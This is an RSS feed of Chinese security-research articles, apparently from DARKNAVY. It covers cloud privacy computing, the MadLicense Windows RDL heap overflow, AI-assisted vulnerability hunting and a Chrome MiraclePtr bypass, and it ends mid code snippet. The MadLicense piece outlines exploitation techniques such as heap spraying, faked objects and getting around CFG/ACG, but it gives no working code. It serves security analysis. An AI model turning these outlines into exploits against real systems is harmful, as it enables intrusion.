<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>DARKNAVY</title>
    <link>https://www.darknavy.org/zh/</link>
    <description>Recent content on DARKNAVY</description>
    <image>
      <title>DARKNAVY</title>
      <url>https://www.darknavy.org/images/white_logo.png</url>
      <link>https://www.darknavy.org/images/white_logo.png</link>
    </image>
    <generator>Hugo -- 0.142.0</generator>
    <language>zh</language>
    <lastBuildDate>Wed, 12 Feb 2025 16:40:12 +0800</lastBuildDate>
    <atom:link href="https://www.darknavy.org/zh/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>2024年最“隐”人注目的安全趋势</title>
      <link>https://www.darknavy.org/zh/darknavy_insight/the_most_prominent_privacy_security_trend_of_2024/</link>
      <pubDate>Wed, 12 Feb 2025 16:40:12 +0800</pubDate>
      <guid>https://www.darknavy.org/zh/darknavy_insight/the_most_prominent_privacy_security_trend_of_2024/</guid>
      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://www.darknavy.org/zh/darknavy_insight/the_most_prominent_privacy_security_trend_of_2024/attachments/f43ec1bc-1e64-402d-bf85-8c1d85b9576e.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;2025年伊始，持续五年的“Siri偷听门”事件终于迎来了终章。苹果公司以9500万美元的和解金，与原告达成了集体诉讼的和解。&lt;/p&gt;
&lt;p&gt;这起备受瞩目的隐私争议案件起源于用户指控Siri在未经授权的情况下，意外捕获并录制日常对话，并将数据泄露给第三方广告商。&lt;/p&gt;
&lt;p&gt;尽管苹果对此坚决否认，但公众对隐私安全的忧虑却与日俱增。&lt;strong&gt;而如今，我们每天都在与AI共享海量的个人数据，这些隐私数据，真的足够安全吗？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;以下为本期《深蓝洞察 | 2024 年度安全报告》的第五篇。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://www.darknavy.org/zh/darknavy_insight/the_most_prominent_privacy_security_trend_of_2024/attachments/9538ac55-86fc-4a4c-ac26-ef19915eadbf.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;设想这样一个场景：&lt;/p&gt;
&lt;p&gt;清晨，你走进一家咖啡馆，手机已经为你点好了一杯拿铁。正当你享受咖啡带来的片刻宁静时，手机屏幕上正循环播放着那些自动生成的相册视频——每一帧仿佛都精确捕捉了你手机中珍藏的记忆。不久后，你接到一个境外来电，接通之后，屏幕上立刻弹出一则&amp;quot;反诈提醒&amp;quot;。&lt;/p&gt;
&lt;p&gt;你不由自主地陷入沉思： &lt;/p&gt;
&lt;p&gt;为何咖啡馆能如此准确地推断出你偏爱的咖啡口味？&lt;/p&gt;
&lt;p&gt;手机中自动生成相册的视频究竟是在本地处理，还是已被上传到云端？&lt;/p&gt;
&lt;p&gt;那张记录助记词的照片，现在是不是也正悄然存放在某个不为人知的云端？&lt;/p&gt;
&lt;p&gt;而突然出现的反诈提醒，是否意味着你的通话语音正被某个第三方实时监听？&lt;/p&gt;
&lt;p&gt;…&lt;/p&gt;
&lt;p&gt;如果说五年前的隐私问题源于智能助手技术的不成熟，那么五年后的今天，随着AI大模型的全面普及，隐私挑战正以更广泛的形式席卷而来。&lt;/p&gt;
&lt;p&gt;万物皆AI的时代，意味着海量用户数据需要被采集、处理和利用，用户隐私数据价值更高；此外，由于终端算力的局限，绝大部分数据处理任务不得不依赖云端。用户的数据是否在云端能够真正得到安全保障？从语音助手到大模型，隐私问题并没有随技术的进步而消失，反而愈发凸显。口号式的隐私承诺早已不足以令人信服，只有通过技术上可证明、可验证的保障，才能真正守住隐私底线。&lt;/p&gt;
&lt;h2 id=&#34;隐私计算大模型时代的安全基石&#34;&gt;隐私计算：大模型时代的安全基石&lt;/h2&gt;
&lt;p&gt;隐私计算，是解决AI与隐私冲突的关键方案。&lt;/p&gt;
&lt;p&gt;从金融到医疗，&lt;strong&gt;数据孤岛现象&lt;/strong&gt;依旧如顽石横亘在前。竞争关系、隐私问题与技术障碍让不同机构之间的数据难以互通，数据价值也因此未能完全释放。而对于个人而言，每日与无数模型和应用交互时，如何确保自己的隐私不被泄露或滥用，更是当务之急。&lt;/p&gt;
&lt;p&gt;隐私计算技术应运而生，其核心目标是在数据不可见的前提下，实现数据的最大化价值。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;首先，通过&lt;strong&gt;多方安全计算&lt;/strong&gt;[1]和&lt;strong&gt;同态加密&lt;/strong&gt;[2]，隐私计算让敏感数据在加密状态下依旧可计算与分析，实现了数据的&amp;quot;可用不可见&amp;quot;。&lt;/li&gt;
&lt;li&gt;其次，&lt;strong&gt;联邦学习&lt;/strong&gt;[3]技术让&amp;quot;数据不动模型动&amp;quot;成为现实。在保障隐私安全的同时，多方数据可以协同计算，进一步提升数据的价值。&lt;/li&gt;
&lt;li&gt;此外，&lt;strong&gt;可信执行环境&lt;/strong&gt;[4]则为数据计算提供了硬件隔离的安全基石。通过隔离计算环境，隐私计算能够确保计算过程的安全可信。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;随着大模型的爆发式增长，上云成为不可逆转的趋势。端侧算力的局限性让云端处理成为复杂任务的优选方案，端云协同成为模型应用的重要方向。Apple PCC (Private Cloud Compute)[5]等端云协同方案已经树立了标杆。&lt;/p&gt;
&lt;p&gt;然而，用户上传至云端的数据是否真正安全，依然是悬而未决的问题：&lt;strong&gt;数据上传后，是否会被窃取或滥用？如何让用户信任云端设施的安全性？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;br&gt;
&lt;img alt=&#34;Apple PCC 的运行时安全架构[6]&#34; loading=&#34;lazy&#34; src=&#34;https://www.darknavy.org/zh/darknavy_insight/the_most_prominent_privacy_security_trend_of_2024/attachments/254f2987-d595-4706-aaac-2e9ebb4235c7.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;为了解决这些问题，隐私计算在云端的应用尤为重要，但这需要克服多方面的挑战：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;首先，云端与端侧需具备同等的安全能力&lt;/strong&gt;。为此，厂商需要通过可信执行环境和硬件隔离技术，确保用户数据在计算过程中不会被泄露。例如，Apple PCC 专门设计的Apple Silicon服务器和定制版iOS系统，从安全引导、代码签名，到运行时的各种软硬件保护层层把关，同时，端到端加密通信确保数据只有用户可见，推理完成后定期清空缓存数据。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;其次，云端环境必须对特权访问进行严格限制&lt;/strong&gt;。过去不乏拿用户隐私数据作恶的案例，例如Uber在 2016 年发生的5700万用户数据泄露，就源于内部员工利用特权访问窃取数据。因此，服务器和数据库的管理人员需要受到严格监控和权限约束，确保无法滥用访问权限。Apple PCC不仅不提供shell或调试接口，所有日志和事件也必须经过严格过滤后才能离开节点。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;最后，云端隐私计算能力的可信性需要透明化验证&lt;/strong&gt;，这也是推动模型应用的关键。然而，目前国内尚无统一的第三方验证标准，这在一定程度上阻碍了云端隐私计算的推广。Apple PCC将云端节点的二进制测量数据（包括操作系统、所有代码固件的测量值）公开在透明度日志中，接受第三方专家的验证，并建立高额的赏金计划，树立了信任标杆。&lt;/p&gt;
&lt;p&gt;&lt;br&gt;
&lt;img src=&#34;attachments/1505f28c-757d-493b-87a6-cb295ff5f7c5.png&#34; style=&#34;display: block; margin-left: auto; margin-right: auto; zoom: 40%;&#34;/&gt;&lt;/p&gt;
&lt;p&gt;此外，即使云端硬件的安全特性能够确保软件的完整性，&lt;strong&gt;但硬件本身的完整性又如何保证呢&lt;/strong&gt;？云端服务器硬件的制作过程往往是不完全公开，其上的硬件指令是否如记载的那样执行，也是难以验证的。&lt;/p&gt;
&lt;p&gt;对于Apple PCC而言，每台服务器被密封前都会进行清点并拍照，并在数据中心被多方团队进行重新验证。然而，这一流程也并非完全的公开透明。如果深究到底，用户仍然无法完全信任硬件指令产生的透明度测量值是真实的，&lt;strong&gt;甚至是否存在三角测量行动那样的硬件后门&lt;/strong&gt;。这仍然是现有厂商需要深入思考的问题。&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;DARKNAVY 针对 Apple PCC 的研究成果&#34; loading=&#34;lazy&#34; src=&#34;https://www.darknavy.org/zh/darknavy_insight/the_most_prominent_privacy_security_trend_of_2024/attachments/0e0b4319-4e72-4add-8b8d-4142e0243905.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;为了验证Apple PCC是否如白皮书所宣称的那样具备绝对的安全性，DARKNAVY基于其发布的虚拟研究环境（VRE）和部分开源代码开展了深入研究。研究结果显示，得益于其软硬件一体化的独特安全机制，Apple PCC能够有效防止隐私泄露的风险，并显著降低远程攻击的可能性。然而，DARKNAVY的研究也发现了一些可能导致云端推理引擎发生崩溃的输入，这表明Apple PCC并非绝对安全。&lt;/p&gt;
&lt;h2 id=&#34;国产探索与未来趋势&#34;&gt;国产探索与未来趋势&lt;/h2&gt;
&lt;p&gt;在大模型时代的云计算浪潮中，&lt;strong&gt;隐私安全与机密计算已成为安全行业无法回避的关键话题&lt;/strong&gt;。个人、企业甚至国家都在寻找切实可行的方案来保障数据安全。试想，如果隐私数据随意裸奔于云端，AI功能再强大也会被画上巨大的问号。&lt;/p&gt;
&lt;p&gt;在国内，蚂蚁集团开源的可信隐私计算框架「&lt;strong&gt;隐语 SecretFlow&lt;/strong&gt;」[7]作为先驱者，以通用化方案整合可信执行环境、多方安全计算和联邦学习等多种技术，试图打破主流框架单一技术路线的局限。隐语通过将各种技术抽象为&amp;quot;密态设备&amp;quot;，并提供统一SDK接口，开发者无需深入底层即可快速实现具备隐私保护特性的算法应用。&lt;/p&gt;
 &lt;img src=&#34;attachments/e99ce1d6-c4df-4a9c-b87b-b7caceaff122.png&#34; style=&#34;display: block; margin-left: auto; margin-right: auto; zoom: 80%;&#34;/&gt;
&lt;p&gt;与此同时，国产手机厂商也在探索大模型与隐私计算的结合。与Apple PCC的一体化生态不同，安卓阵营因品牌与系统版本的多样性而显得碎片化，其用户隐私安全问题更为复杂。&lt;/p&gt;</description>
    </item>
    <item>
      <title>2024年度最狂躁不安的漏洞</title>
      <link>https://www.darknavy.org/zh/darknavy_insight/the_maddest_vulnerability_of_2024/</link>
      <pubDate>Tue, 11 Feb 2025 11:41:45 +0800</pubDate>
      <guid>https://www.darknavy.org/zh/darknavy_insight/the_maddest_vulnerability_of_2024/</guid>
      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://www.darknavy.org/zh/darknavy_insight/the_maddest_vulnerability_of_2024/attachments/8d7f8b1c-b32a-4943-9b1d-fcdcf71c6a1e.webp&#34;&gt;&lt;/p&gt;
&lt;p&gt;在安全研究人员的共同努力下，越发严格的安全缓解措施，已经把大部分内存漏洞扼杀在了摇篮之中。&lt;/p&gt;
&lt;p&gt;是时候宣布内存漏洞成为过去式了？&lt;/p&gt;
&lt;p&gt;2024年7月，一枚来自Windows阵营的&amp;quot;核弹&amp;quot;打破了安全的幻象。我们不禁发问：面对来自内存的威胁，眼前的城墙究竟能抵挡些什么？&lt;/p&gt;
&lt;p&gt;以下为本期《深蓝洞察 | 2024 年度安全报告》的第四篇。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://www.darknavy.org/zh/darknavy_insight/the_maddest_vulnerability_of_2024/attachments/970c2c86-bd62-4753-9cbc-87c8c0a5af7f.webp&#34;&gt;&lt;/p&gt;
&lt;p&gt;2024年5月，Lewis Lee、Chunyang Han和Zhiniang Peng向微软报告了一个存在于Windows Server RDL (Remote Desktop Licensing)服务中的漏洞。7月，该漏洞被修复并出现在公众视野。&lt;/p&gt;
&lt;p&gt;一石激起千重浪，作为一个&lt;strong&gt;无需认证、无需用户交互&lt;/strong&gt;即可触发&lt;strong&gt;远程代码执行&lt;/strong&gt;的内存破坏漏洞，它一经出现便迅速激起各大安全厂商与从业者的高度关注，一度被称作&amp;quot;&lt;strong&gt;核弹级漏洞&amp;quot;&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;这就是本篇的主角——&lt;strong&gt;狂躁许可（MadLicense）&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;尽管该漏洞起初被认为是比肩&amp;quot;永恒之蓝&amp;quot;的存在，经调研发现，它的影响范围实际上相对有限。该漏洞存在于Windows Server上的RDL服务而非通常认为的RDP协议。该服务仅作为一个可选安装项，用于允许多个用户通过RDP连接到服务器，&lt;strong&gt;与大部分个人用户关系不大&lt;/strong&gt;。此外该漏洞存在于用户态，单个漏洞对系统的威胁能力较为有限。&lt;/p&gt;
&lt;p&gt;漏洞的成因是远程未授权用户能通过RPC远程调用RDL服务中的&lt;code&gt;TLSRpcTelephoneRegisterLKP&lt;/code&gt;函数。该函数的子函数中对用户的部分输入进行base24到base10的解码，该功能并没有对输入长度进行限制，导致了一个&lt;strong&gt;无长度限制的堆溢出漏洞&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;作为一个内存破坏漏洞，它的破坏力不容小觑。于是我们立即着手进行复现，并试图探究，在&lt;strong&gt;内存漏洞式微、安全缓解措施愈发严格&lt;/strong&gt;的今天，要在最新Windows平台利用这样一个经典的堆溢出漏洞，会遇到哪些阻碍和挑战？&lt;/p&gt;
&lt;p&gt;&lt;video src=&#34;attachments/617e65a7-5214-477b-8e75-72b67899a97f.mp4&#34; controls=&#34;controls&#34; width=&#34;100%&#34; height=&#34;auto&#34;&gt;&lt;/video&gt;&lt;/p&gt;
&lt;p&gt;复现结果如图。攻击机（右侧）运行恶意脚本，在受害者主机未进行任何操作的情况下，可稳定地拿下远程主机的控制权（左侧shell）。&lt;/p&gt;
&lt;p&gt;自Windows 10引入的&lt;strong&gt;segment heap&lt;/strong&gt;堆实现机制，被广泛应用在系统进程中。对于常用尺寸内存的分配，使用VS(Variable Size)或LFH(Low Fragmentation Heap)分配器实现。&lt;/p&gt;
 &lt;img src=&#34;attachments/4269c94f-503f-4b61-9e69-2ad0390aac70.webp&#34; style=&#34;display: block; margin-left: auto; margin-right: auto; zoom: 30%;&#34;/&gt;
&lt;p&gt;VS分配器对于溢出的防护机制较为完善。对于每个堆块，块首中的重要信息均被加密；空闲堆块间的连接也由安全性更高的数据结构代替。这些保护机制使得漏洞利用需要一定程度的信息泄露，大大提升了攻击门槛。&lt;/p&gt;
&lt;p&gt;然而当某一尺寸达到一定分配次数时，堆块分配会转为使用效率更高的LFH进行实现。&lt;/p&gt;
&lt;p&gt;相较VS，LFH的防护机制相对宽松。LFH堆块不存在块首，因此可以毫无阻碍地溢出到相邻堆块。为了缓解这一利用，LFH的分配采用了完全的随机化：堆块布局随机，且重用最近释放的堆块也不再可靠。这一点可以通过堆喷射的技巧进行绕过。&lt;/p&gt;
&lt;p&gt;在狂躁许可漏洞造成的无限制堆溢出面前，segment heap的防御机制被轻易击穿了。我们依然可以轻易溢出到目标堆块，伪造对象以获取&lt;strong&gt;任意地址读写/任意地址调用&lt;/strong&gt;的原语。&lt;/p&gt;
&lt;p&gt;到这里利用还没有结束。接下来面对的通用内存缓解措施表现会如何？&lt;/p&gt;
&lt;p&gt;微软在Windows 8.1 Update 3和Windows 10中引入了一项重量级的缓解措施——&lt;strong&gt;控制流保护（CFG）&lt;/strong&gt;。在启用CFG后，间接调用会使用编译期间生成的位图进行验证，确保仅对进程中加载模块的函数入口处进行调用，从而有效阻断了传统的代码片段重用攻击。&lt;/p&gt;
&lt;p&gt;另一个在Windows 10被引入的缓解措施是&lt;strong&gt;任意代码防护（ACG）&lt;/strong&gt;。ACG可防止现有代码被修改，同时阻止了动态分配可执行内存。ACG与CFG同时开启的情况下，同时绕过这两大防护变得格外困难，几乎杜绝了传统的写入执行shellcode的可能性。&lt;/p&gt;
&lt;p&gt;需要注意的是，这两个机制并不能防止攻击者调用&lt;code&gt;CreateProcessA&lt;/code&gt;等可能被滥用的函数。在不绕过以上内存缓解措施的情况下，任意函数调用已经足够允许我们在目标机上执行任意命令。&lt;/p&gt;
&lt;p&gt;而漏洞原作者之一，华中科技大学副教授彭峙酿向我们透露，他们能够&lt;strong&gt;近100%稳定利用、执行任意shellcode&lt;/strong&gt;。这意味着以上内存缓解措施依然存在被绕过的可能。&lt;/p&gt;
&lt;p&gt;为何在采用最新缓解措施的Windows Server 2025上，此内存漏洞依然能被完整利用？&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;彭峙酿这样回答&lt;/strong&gt;：目前在Windows众多最新缓解措施全开的情况下，由一个内存破坏漏洞实现远程利用，正常来说是极难的。很多漏洞已不存在被利用的路径，或路径极少极隐蔽。&lt;/p&gt;
&lt;p&gt;但这并不代表目前的缓解措施杀死了所有的漏洞利用。能否完成利用往往取决于：攻击者为了完成利用所愿意投入的时间、对相关代码模块的熟悉程度、漏洞和具体模块的特殊情况。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h2 id=&#34;deepseek锐评&#34;&gt;DeepSeek锐评&lt;/h2&gt;
&lt;p&gt;微软对狂躁许可漏洞&amp;quot;几乎不可能利用&amp;quot;的傲慢断言，折射出安全行业长期存在的评估悖论：当漏洞评级体系脱离攻击者视角，便沦为自欺欺人的技术乌托邦。&lt;/p&gt;
&lt;p&gt;防御者用静态指标丈量动态攻防，用理论模型否定实战可能，恰是安全防御最大的盲区。此次漏洞利用链突破多重内存防护的实践证明，安全评估不应是厂商的&amp;quot;免责声明&amp;quot;，而应成为攻防对抗的动态标尺。若不能正视攻击者&amp;quot;技术暴力&amp;quot;的突破能力，再完美的缓解措施都将沦为数字时代的马奇诺防线。&lt;/p&gt;
&lt;hr&gt;</description>
    </item>
    <item>
      <title>2024年度最具想象空间的新应用</title>
      <link>https://www.darknavy.org/zh/darknavy_insight/the_most_imaginative_new_applications_of_2024/</link>
      <pubDate>Mon, 10 Feb 2025 11:25:50 +0800</pubDate>
      <guid>https://www.darknavy.org/zh/darknavy_insight/the_most_imaginative_new_applications_of_2024/</guid>
      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://www.darknavy.org/zh/darknavy_insight/the_most_imaginative_new_applications_of_2024/attachments/1ad18afd-362e-414f-a907-3b86a212e397.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;2023年是生成式AI和大型语言模型的元年，它们以前所未有的方式输出内容。&lt;/p&gt;
&lt;p&gt;2024年，涌现出大量的AI智能体（AI Agent）不仅扩展了大模型的能力边界，还驱动了更广泛的工具使用，并将其应用场景拓展到更多领域。&lt;/p&gt;
&lt;p&gt;对于安全研究者而言，如何借助AI力量的提高工作效率，甚至驱动AI像人类一样思考、分析、挖掘漏洞，已成为一个关键话题。&lt;/p&gt;
&lt;p&gt;是率先拥抱AI，还是被AI取代，这一天何时会到来？&lt;/p&gt;
&lt;p&gt;以下为本期《深蓝洞察 | 2024 年度安全报告》的第三篇。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://www.darknavy.org/zh/darknavy_insight/the_most_imaginative_new_applications_of_2024/attachments/1a724053-1a90-48e6-81c5-5d26174869b8.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;随着生成式AI的出现，其展现出的惊人代码理解能力，无疑表现出其可能颠覆安全研究领域的潜力。&lt;/p&gt;
&lt;p&gt;23年以来，安全研究人员们便开始尝试利用大模型的知识库及内容生成能力提高安全研究各个阶段的效率：&lt;/p&gt;
&lt;p&gt;向大模型提问能够帮助安全研究员快速理解代码的功能、使用大模型快速生成测试代码、将大模型集成至IDE中并提供编码安全建议…&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;DARKNAVY借助大模型辅助分析发现的Chrome AI模块高危漏洞&#34; loading=&#34;lazy&#34; src=&#34;https://www.darknavy.org/zh/darknavy_insight/the_most_imaginative_new_applications_of_2024/attachments/6c082f7c-8610-41b4-b74b-dbecf585084c.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;同样也有一系列基于大模型的工具应运而生：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;将大模型作为安全研究知识库可以有效提高面对不熟悉领域问题时的解决效率。云起无垠通过使用大量网络安全数据集训练了SecGPT网络安全大模型，作为专家系统帮助研究人员为各种网络安全任务提供建议。&lt;/li&gt;
&lt;li&gt;在渗透测试领域，南洋理工大学邓格雷将大模型应用于Web渗透测试领域，设计了PentestGPT，针对渗透过程中的目标扫描、漏洞利用等流程提供帮助；BurpGPT通过使用大模型对网络流量进行分析，识别传统扫描器可能遗漏的漏洞。&lt;/li&gt;
&lt;li&gt;在逆向分析方面，Gepetto作为逆向分析工具IDA Pro的插件，通过接入大模型对反编译代码进行语义理解。&lt;/li&gt;
&lt;li&gt;软件安全研究基础设施方面，清华大学副教授张超团队使用机器指令语料库训练的机器语言大模型（MLM），不仅能够比传统反编译方案能够获得包含程序语义、更直观易懂的反编译代码，还能够进一步通过MLM辅助解决漏洞挖掘、软件相似性分析等软件安全领域问题。&lt;/li&gt;
&lt;li&gt;…&lt;/li&gt;
&lt;/ul&gt;
 &lt;img src=&#34;attachments/1e3b25d2-3f4f-4939-9201-82f133147496.png&#34; style=&#34;display: block; margin-left: auto; margin-right: auto; zoom: 60%;&#34;/&gt;
&lt;p&gt;这些工具毫无疑问推动了安全研究中各阶段的效率，但在安全研究者们最期望解决的&lt;strong&gt;未知漏洞自动化挖掘与修复方面&lt;/strong&gt;，结合DARKNAVY的安全研究经验，当前的大模型仍面临诸多挑战。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;一方面，大模型的上下文窗口限制了其对程序的理解范围。ChatGPT-4o的上下文窗口为128k tokens，而现实世界的程序代码通常代码量较大、漏洞常常跨越多个文件，可能出现超长的上下文。尽管有支持上千万tokens上下文窗口的大模型出现，但处理超长上下文时，模型可能会分散注意力甚至遗忘部分内容，定位特定的代码片段犹如大海捞针。&lt;/li&gt;
&lt;li&gt;另一方面，大模型难以进行较精密的计算且容易产生幻觉。安全漏洞时常伴随着苛刻的触发条件，而目前的大模型难以进行精确的状态推理和数学计算，从而对程序状态可能做出误判，导致误报。而静态代码的复杂性及状态不确定性，使得大模型难以通过简单推理验证漏洞的真实性。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;2024年，为了推动大模型在自动化漏洞挖掘领域的能力边界，AIxCC参赛团队、Google等都在尝试通过AI Agent的方式，结合传统漏洞分析方法、为大模型添加更多的工具、指导大模型参考人类研究方式开展自治化程度更高的漏洞分析工作。&lt;/p&gt;
&lt;h2 id=&#34;naptime&#34;&gt;Naptime&lt;/h2&gt;
&lt;p&gt;Google的&amp;quot;Naptime&amp;quot;项目通过AI Agent（智能体）的方式，为其提供了一系列人类研究员常用的工具，使Agent模仿人类研究员的思维及行为方式，通过不断地迭代分析漏洞、假设驱动的研究方式，自主选择并使用工具获取更准确的信息，从而提升了Agent发现漏洞的能力。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;代码浏览器&lt;/strong&gt;：Agent可以使用代码浏览器像人类一样阅读代码仓库中特定片段的代码，从而保证&amp;quot;Naptime&amp;quot;在处理大型代码库时，能够更加&amp;quot;专心&amp;quot;地分析特定的函数或变量。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;调试器&lt;/strong&gt;：能够帮助Agent获取程序运行时的信息，Agent可以在调试器中设置断点并观察程序在不同输入数据下的行为，从而实现动态分析。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Python工具&lt;/strong&gt;：Agent能够运行Python脚本对程序的中间状态进行精确的计算。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如此一来，Naptime便能模仿人的研究方式，浏览代码仓库中感兴趣的代码，并根据函数调用关系进行分析，实现全自动化的漏洞挖掘流程。&lt;/p&gt;
 &lt;img src=&#34;attachments/b9629094-fbd8-45b3-9fbf-704580415126.png&#34; style=&#34;display: block; margin-left: auto; margin-right: auto; zoom: 60%;&#34;/&gt;
&lt;p&gt;终于，在24年10月，Naptime的进化版Big Sleep在SQLite中发现了一个潜在可利用的0day漏洞。&lt;/p&gt;
&lt;p&gt;Big Sleep在浏览代码时，对漏洞函数中的断言（assertion）产生了兴趣，如同人类研究员一般，开始分析触发该断言的可能性并推断触发条件。随后Big Sleep尝试将输入iCol设为-1，并利用调试器进行测试，成功触发断言导致crash。&lt;/p&gt;
 &lt;img src=&#34;attachments/f518e7d3-8f09-49fc-8836-d8cccb3060af.png&#34; style=&#34;display: block; margin-left: auto; margin-right: auto; zoom: 60%;&#34;/&gt;
&lt;p&gt;尽管这个漏洞在调试环境中会触发断言，但Google研究人员发现在release版本中，并不会包含该断言，从而导致该漏洞具备了可利用性。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Google使Agent按照人类的思考方式阅读代码、测试输入，成功利用大模型的代码理解能力实现自动化代码安全性分析，并避免了大模型幻觉导致的误报。&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;aixcc&#34;&gt;AIxCC&lt;/h2&gt;
&lt;p&gt;同样是SQLite3，早在2024年8月，AIxCC主办方报告了Team Atlanta发现的一个off-by-one导致空指针解引用漏洞。&lt;/p&gt;
 &lt;img src=&#34;attachments/002a0b60-7f96-4067-833b-7b6bbb181bd5.png&#34; style=&#34;display: block; margin-left: auto; margin-right: auto; zoom: 50%;&#34;/&gt;
&lt;p&gt;&lt;strong&gt;为什么 Team Atlanta 没有自己报告漏洞呢？&lt;/strong&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>2024年最具含“金”量的绕过</title>
      <link>https://www.darknavy.org/zh/darknavy_insight/the_most_golden_bypass_of_2024/</link>
      <pubDate>Sun, 09 Feb 2025 17:13:30 +0800</pubDate>
      <guid>https://www.darknavy.org/zh/darknavy_insight/the_most_golden_bypass_of_2024/</guid>
      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://www.darknavy.org/zh/darknavy_insight/the_most_golden_bypass_of_2024/attachments/a9bb1fb8b45e13bebaef9cd37af06097.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;基于浏览器漏洞的攻击，自2000年代初出现以来直至今日，一直是一种主流、有效且场景丰富的攻击手段。以下为本期《深蓝洞察 | 2024 年度安全报告》的第二篇。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://www.darknavy.org/zh/darknavy_insight/the_most_golden_bypass_of_2024/attachments/640.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;根据市场调查机构 Statcounter 公布的最新报告，Chrome浏览器无可争议地牢牢占据了市场占有率第一的宝座。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://www.darknavy.org/zh/darknavy_insight/the_most_golden_bypass_of_2024/attachments/085f2c36-5c81-4182-b887-93394febe001.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Chrome以其卓越的安全性而著称，Google安全团队一直致力于研究应用最前沿的漏洞缓解机制。MiraclePtr就是其中最为知名的缓解机制之一，旨在防止浏览器中的UAF漏洞被攻击者利用。&lt;/p&gt;
&lt;p&gt;Chrome中的PartitionAlloc堆分配器在分配和释放对象时维护了一个用户无感知的refcount字段，简单概括MiraclePtr这一缓解机制就是：若对象在被释放时，对该对象的refcount并不是0，这意味着代码中存在危险的引用，这是一个潜在的UAF对象，此时堆管理器会将此危险的对象隔离，从而阻止了后续可能的漏洞利用。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;2022年6月，全新的安全机制MiraclePtr正式地在Windows和Android平台下的browser进程中启用；&lt;/li&gt;
&lt;li&gt;2022年9月，扩大启用范围，除renderer进程外的所有进程皆启用；&lt;/li&gt;
&lt;li&gt;2023年6月，MiraclePtr在全平台启用（ChromeOS, macOS, 和Linux）；&lt;/li&gt;
&lt;li&gt;2024年7月，Chrome VRP宣布：被MiraclePtr保护住的UAF漏洞将不再视为安全问题。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;是什么给了Chrome安全团队如此底气，直接无视这一类严重的内存破坏问题？&lt;/p&gt;
&lt;p&gt;想回答这个问题，就不得不提到24年的一例MiraclePtr绕过。在24年的5月，Chrome发布的一则巨额漏洞奖金格外引人注目，其数额高达&lt;strong&gt;10万美元&lt;/strong&gt;，这正是Chrome VRP悬赏的MiraclePtr Bypass的赏金数字。&lt;/p&gt;
 &lt;img src=&#34;attachments/582cdd8b-4ae0-4ec9-94a8-c1e8dcac68b3.png&#34; style=&#34;display: block; margin-left: auto; margin-right: auto; zoom: 50%;&#34;/&gt;
&lt;p&gt;待issue完全公开后，大家才终于明白绕过的细节。PartitionAlloc中在进行refcount加一的操作后，代码中会检测refcount是否溢出，若发生溢出则会触发进程的主动崩溃。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;CountType&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;old_count&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;count_&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fetch_add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kPtrInc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;std&lt;/span&gt;&lt;span 